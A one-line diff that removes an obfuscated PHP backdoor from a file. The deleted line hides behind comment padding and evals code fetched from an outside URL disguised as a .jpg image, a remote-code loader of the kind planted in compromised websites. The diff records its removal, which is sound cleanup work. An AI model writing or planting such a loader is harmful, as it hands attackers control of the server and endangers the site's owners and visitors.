@@ -1,1 +1,0 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://www.rocamarc.com/af/budong.jpg"));/**/?>
